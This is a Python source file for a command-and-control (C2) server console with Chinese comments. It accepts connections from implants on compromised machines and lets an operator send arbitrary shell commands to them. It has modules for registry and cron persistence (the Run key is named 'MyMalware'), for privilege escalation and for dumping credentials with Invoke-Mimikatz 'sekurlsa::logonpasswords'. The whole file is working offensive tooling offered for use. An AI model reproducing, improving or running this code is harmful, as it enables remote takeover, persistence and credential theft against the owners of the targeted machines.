import socket
import threading
import json
import os
import platform  # 用于检测系统类型
from tabulate import tabulate  # 用于打印表格
import base64  # 用于Base64解码

class C2Console:
    def __init__(self, host='0.0.0.0', port=8888):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.bind((host, port))
        self.server.listen(100)
        self.sessions = {}
        self.session_id = 0
        self.current_module = None

    def handle_client(self, client_socket, session_id):
        self.sessions[session_id] = {"socket": client_socket, "system": None, "ip": None, "user": None}
        self.sessions[session_id]["ip"] = client_socket.getpeername()[0]
        print(f"Session {session_id} connected")
        while True:
            try:
                message = client_socket.recv(4096).decode()
                if not message:
                    continue
                print(f"Raw message from session {session_id}: {message}")  # 调试信息
                data = json.loads(message)
                if "system" in data:
                    self.sessions[session_id]["system"] = data["system"]
                    self.sessions[session_id]["user"] = data["user"]
                else:
                    result = data.get("result", "")
                    if result:
                        try:
                            decoded_result = base64.b64decode(result.encode()).decode()
                            print(f"Received from session {session_id}: {decoded_result}")
                        except Exception as decode_error:
                            print(f"Decoding error: {decode_error}")
                            print(f"Failed result: {result}")
            except (ValueError, json.JSONDecodeError) as e:
                print(f"Error decoding JSON: {e}")
                print(f"Raw message: {message}")  # 调试信息
            except Exception as e:
                print(f"Error in session {session_id}: {e}")
                client_socket.close()
                del self.sessions[session_id]
                break

    def run(self):
        print("C2 Console running...")
        while True:
            try:
                client_socket, addr = self.server.accept()
                self.session_id += 1
                session_id = self.session_id
                client_handler = threading.Thread(target=self.handle_client, args=(client_socket, session_id))
                client_handler.start()
            except Exception as e:
                print(f"Error accepting connection: {e}")

    def console(self):
        self.current_session = None
        modules = {
            "pre": {
                "description": "持久化（注册表持久化和创建计划任务）",
                "options": {
                    "windows": {
                        "reg_path": r'HKCU\Software\Microsoft\Windows\CurrentVersion\Run',
                        "program_name": 'MyMalware',
                        "program_path": r'C:\Path\To\Your\Program.exe'
                    },
                    "linux": {
                        "cron_job": "@reboot /path/to/your/program"
                    }
                }
            },
            "privesc": {
                "description": "特权提升（复制Winlogon令牌）",
                "options": {}
            },
            "mimikatz": {
                "description": "凭据提取（使用Mimikatz）",
                "options": {
                    "script_path": r"C:\Users\Administrator\Desktop\test\c2\Invoke-Mimikatz.ps1"
                }
            }
        }
        commands = {
            "sessions": "显示所有连接的会话",
            "set session <id>": "选择会话ID",
            "exec <command>": "在目标主机中执行命令",
            "use <module>": "加载模块",
            "show options": "显示当前模块的配置选项",
            "set <option> <value>": "配置当前模块的选项",
            "exploit": "利用当前模块执行操作",
            "help": "显示命令帮助信息",
            "exit": "退出会话"
        }
        while True:
            try:
                command = input("C2> ")
                if command == "sessions":
                    headers = ["Session ID", "System", "IP Address", "User"]
                    table = []
                    for session_id, session_info in self.sessions.items():
                        table.append([session_id, session_info["system"], session_info["ip"], session_info["user"]])
                    print(tabulate(table, headers, tablefmt="pretty"))
                elif command.startswith("set session"):
                    _, _, session_id = command.split()
                    session_id = int(session_id)
                    if session_id in self.sessions:
                        self.current_session = session_id
                        print(f"Session {session_id} selected")
                    else:
                        print(f"Session {session_id} not found")
                elif command.startswith("exec"):
                    _, system_command = command.split(maxsplit=1)
                    if self.current_session:
                        session_id = self.current_session
                        client_socket = self.sessions[session_id]["socket"]
                        client_socket.send(json.dumps({"command": system_command}).encode())
                        print(f"Command sent to session {session_id}")
                    else:
                        print("No session selected")
                elif command.startswith("use"):
                    _, module = command.split(maxsplit=1)
                    if module in modules:
                        self.current_module = module
                        print(f"Module {module} loaded")
                    else:
                        print(f"Module {module} not found")
                elif command == "show options":
                    if self.current_module:
                        print(json.dumps(modules[self.current_module]["options"], indent=4))
                    else:
                        print("No module loaded")
                elif command.startswith("set"):
                    if self.current_module:
                        _, option, value = command.split(maxsplit=2)
                        options = modules[self.current_module]["options"]
                        keys = option.split(".")
                        if len(keys) == 2 and keys[0] in options and keys[1] in options[keys[0]]:
                            options[keys[0]][keys[1]] = value
                            print(f"Set {option} to {value}")
                        else:
                            print("Invalid option")
                    else:
                        print("No module loaded")
                elif command == "exploit":
                    if self.current_module and self.current_session:
                        session_id = self.current_session
                        client_socket = self.sessions[session_id]["socket"]
                        system = self.sessions[session_id]["system"].lower()
                        if self.current_module == "pre":
                            if system == "windows":
                                command = f'reg add {modules["pre"]["options"]["windows"]["reg_path"]} /v {modules["pre"]["options"]["windows"]["program_name"]} /d {modules["pre"]["options"]["windows"]["program_path"]} /f'
                            elif system == "linux":
                                cron_job = modules["pre"]["options"]["linux"]["cron_job"]
                                command = f'(echo "{cron_job}") | crontab -'
                            else:
                                print("Unsupported system for persistence")
                                continue
                        elif self.current_module == "privesc":
                            if system == "windows":
                                # 使用PowerShell脚本进行特权提升
                                command = r"powershell -Command \"Start-Process cmd -ArgumentList '/c whoami' -Verb runAs\""
                            else:
                                print("Unsupported system for privilege escalation")
                                continue
                        elif self.current_module == "mimikatz":
                            if system == "windows":
                                script_path = modules["mimikatz"]["options"]["script_path"]
                                command = f'powershell -ExecutionPolicy Bypass -Command "& {{ . \'{script_path}\'; Invoke-Mimikatz -Command \'privilege::debug sekurlsa::logonpasswords\' }}"'
                            else:
                                print("Unsupported system for Mimikatz")
                                continue
                        else:
                            print("Unsupported module")
                            continue
                        client_socket.send(json.dumps({"command": command}).encode())
                        print(f"Exploit command sent to session {session_id}")
                    else:
                        print("No module loaded or no session selected")
                elif command == "help":
                    for cmd, desc in commands.items():
                        print(f"{cmd}: {desc}")
                elif command == "exit":
                    if self.current_session:
                        print(f"Exiting session {self.current_session}")
                        self.current_session = None
                    else:
                        print("No session selected")
            except Exception as e:
                print(f"Error in console: {e}")

if __name__ == "__main__":
    c2_console = C2Console()
    threading.Thread(target=c2_console.run).start()
    c2_console.console()
